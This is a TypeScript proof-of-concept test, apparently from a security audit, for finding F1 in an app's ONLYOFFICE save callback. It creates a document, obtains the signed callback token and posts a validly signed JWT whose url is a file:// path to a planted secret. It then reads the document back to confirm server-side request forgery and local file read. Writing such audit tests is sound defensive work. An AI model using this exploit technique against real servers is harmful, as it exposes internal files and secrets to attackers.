// F1: ONLYOFFICE save callback fetches from ANY url (no origin/scheme check) -> SSRF / local file read.
// We drive the real callback with a VALID document-server JWT (signed with OFFICE_JWT_SECRET we set),
// so this finding stands alone and does NOT depend on F2 (unsigned-body acceptance).
// Attacker names url = file:///...secret ; server fetches it and makes it the user's document; we read it back.
import { join } from 'node:path'
import { prepEnv, importApp, loginAdmin, signJwt } from './helper'

const SECRET = 'SSRF-SECRET-' + Math.random().toString(36).slice(2)
const JWT_SECRET = 'office-jwt-secret-32-characters-min!!'

const base = prepEnv({
  OFFICE_URL: 'http://localhost:9981',
  OFFICE_INTERNAL_URL: 'http://localhost:3000',
  OFFICE_JWT_SECRET: JWT_SECRET,
})
const secretFile = join(base, 'internal-secret.txt')
await Bun.write(secretFile, SECRET)

const app = await importApp()
const admin = await loginAdmin(app)

const hdr = { cookie: admin.cookie, 'x-csrf-token': admin.csrf, 'content-type': 'application/json' }

// a real, valid document to edit
let r = await app.handle(new Request('http://localhost/api/newfile', {
  method: 'POST', headers: hdr, body: JSON.stringify({ space: 'home', path: '/', name: 'doc.txt' }),
}))
if (r.status !== 200) throw new Error('newfile ' + r.status + ' ' + (await r.text()))
r = await app.handle(new Request('http://localhost/api/content', {
  method: 'PUT', headers: hdr, body: JSON.stringify({ space: 'home', path: '/doc.txt', content: 'ORIGINAL' }),
}))
if (r.status !== 200) throw new Error('put content ' + r.status + ' ' + (await r.text()))

// open in edit mode -> get the signed callback url with its token
r = await app.handle(new Request('http://localhost/api/office/config', {
  method: 'POST', headers: hdr, body: JSON.stringify({ space: 'home', path: '/doc.txt', mode: 'edit' }),
}))
if (r.status !== 200) throw new Error('office/config ' + r.status + ' ' + (await r.text()))
const cfg = await r.json()
const callbackUrl: string = cfg.config.editorConfig.callbackUrl
const token = callbackUrl.split('/api/office/callback/')[1]
if (!token) throw new Error('no callback token')

// the document server "hands back a saved file" from an attacker-chosen url (valid JWT body)
const payload = { status: 2, url: 'file://' + secretFile, exp: Math.floor(Date.now() / 1000) + 3600 }
r = await app.handle(new Request('http://localhost/api/office/callback/' + token, {
  method: 'POST',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ token: signJwt(payload, JWT_SECRET) }),
}))
const cb = await r.json().catch(() => ({}))
console.log('callback response', r.status, JSON.stringify(cb))

// read the document back as the attacker: did the internal file leak into it?
r = await app.handle(new Request('http://localhost/api/content?space=home&path=/doc.txt', {
  headers: { cookie: admin.cookie },
}))
const got = await r.json().catch(() => ({}))
const content = (got as { content?: string }).content ?? ''
console.log('document now contains:', JSON.stringify(content))

if (content.includes(SECRET)) {
  console.log('CONFIRMED: internal file read back through the office document (SSRF/file read)')
  process.exit(42)
}
console.log('safe: callback refused the url, document unchanged')
process.exit(0)
